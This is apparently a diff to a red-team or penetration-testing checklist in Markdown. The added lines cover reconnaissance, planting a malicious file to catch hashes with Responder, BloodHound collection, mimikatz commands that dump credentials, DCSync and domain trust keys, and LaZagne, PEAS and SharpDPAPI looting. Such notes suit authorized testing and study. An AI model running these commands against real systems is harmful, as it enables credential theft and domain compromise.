@@ -7,6 +7,11 @@
 Park creds/key/domain info here:
 ```
 # Reconnaissance
+
+#### Sweep
+For multiple hosts
+`nmap <ip>/<cidr> -Pn`
+
 #### TCP
 Initial Scan
 `sudo nmap <ip> -sC -sT -sV -p<ports> -oN ~/path/<standalone>/<standalone>_TCP_ALL`
@@ -256,7 +261,9 @@ place ports and findings here...
 - [ ] **1. Initial Upload & Client-Side Bypass**
     
     - [ ] Upload a raw shell (`shell.php`) to test baseline validation.
-	        
+		
+	- [ ] Test user interactivity. Upload malicious revshell file (like badpdf) and host responder server to catch hashes.
+		
     - [ ] Inspect page source (CTRL+SHIFT+C) and delete client-side JS validation functions (e.g., `onchange="checkFile(this)"`).
 		    
 	- [ ] Test for SSRF by uploading a file a user will click that hits Responder. Capture hash.
@@ -719,6 +726,12 @@ windows exploit suggester
 
 [[AD Recycle Bin]]
 	-
+
+AD Bloodhound collection
+	New Users? bloodhound-python / nxc
+		-
+	New box pwned? sharphound
+		-
 #### Linux:
 hostname
 	-
@@ -871,7 +884,7 @@ Establish and document elevated persistence method here.
 OPSEC? - WMI Event Subscription
 ```
 
-# Credential Access
+# Credential Access / Looting
 
 ```
 OPSEC? DON'T DUMP LSASS BRO... otherwise mimikatz ;)
@@ -897,6 +910,9 @@ High Integrity cred access
 OS Credential Dumping 
 ```powershell
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::credman" "sekurlsa::ekeys" "lsadump::sam" "lsadump::lsa" "lsadump::cache" "lsadump::secrets" "exit"
+
+# Optional - on DC
+"lsadump::dcsync /user:Domain\Username /history"  # Dump history of a specific user
 ```
 
 LaZagne.exe
@@ -904,6 +920,18 @@ LaZagne.exe
 .\LaZagne.exe all
 ```
 
+Peas
+```
+.\winpeas.exe
+
+./linpeas
+```
+
+DPAPI (Sometimes LaZagne misses things)
+```powershell
+# DPAPI Key one-shot
+SharpDPAPI.exe triage
+```
 # User Impersonation
 ```powershell
 # NOTE: use token-store whenever we impersonate
@@ -932,6 +960,7 @@ PtC
 RunasCs.exe
 	-
 # Discovery
+
 #### BloodHound
 SharpHound `BAD OPSEC`
 	-
@@ -1003,6 +1032,11 @@ Reverse Port Forward
 
 Ligolo-ng
 	-
+
+Repeat port enumeration from each compromised host (Test-NetConnection / nmap)
+	Critical in segmented/multi-domain environments
+	-
+
 # MSSQL
 
 Present?
@@ -1048,6 +1082,11 @@ DPAPI Backup Keys
 	-
 
 # Forest and Domain Trusts
+
+Dump trust keys
+```powershell
+mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
+```
 
 Enumerate Trust Accounts
 ```powershell
